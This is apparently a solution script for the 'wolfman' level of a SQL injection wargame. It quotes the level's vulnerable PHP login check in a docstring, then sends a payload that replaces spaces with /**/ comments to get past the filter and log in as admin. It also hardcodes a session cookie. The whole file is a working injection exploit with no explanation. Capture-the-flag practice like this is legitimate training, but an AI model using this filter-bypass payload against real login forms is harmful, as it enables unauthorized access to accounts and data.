import requests

"""
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
  $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("wolfman"); 
  highlight_file(__FILE__); 
?>
"""
url = "https://los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php"
payload = {"pw":"0'/**/or/**/id='admin'#"}
cookie = dict(PHPSESSID="tv814q1qgkcg3pg22pjgl9fc95")
r = requests.get(url,params=payload,cookies=cookie)
#print(r.text)
if 'Clear' in r.text:
    print("clear")
else:
    print("try again")